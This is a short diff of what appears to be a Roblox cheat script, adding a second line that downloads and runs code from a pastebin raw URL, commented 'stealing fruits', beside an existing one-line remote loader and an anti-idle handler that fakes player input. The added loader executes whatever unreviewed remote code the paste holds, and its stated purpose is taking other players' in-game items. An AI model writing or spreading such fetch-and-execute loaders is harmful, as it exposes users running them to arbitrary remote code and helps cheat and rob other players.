@@ -23,6 +23,8 @@ print("Loaded in 4.73 seconds")
 
 loadstring(game:HttpGet("https://pastebin.com/raw/XiN9XAaM"))() -- ez
 
+loadstring(game:HttpGet("https://pastebin.com/raw/RC6HtXg0"))() -- stealing fruits
+
 local vu = game:GetService("VirtualUser")
 game:GetService("Players").LocalPlayer.Idled:connect(function()
    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
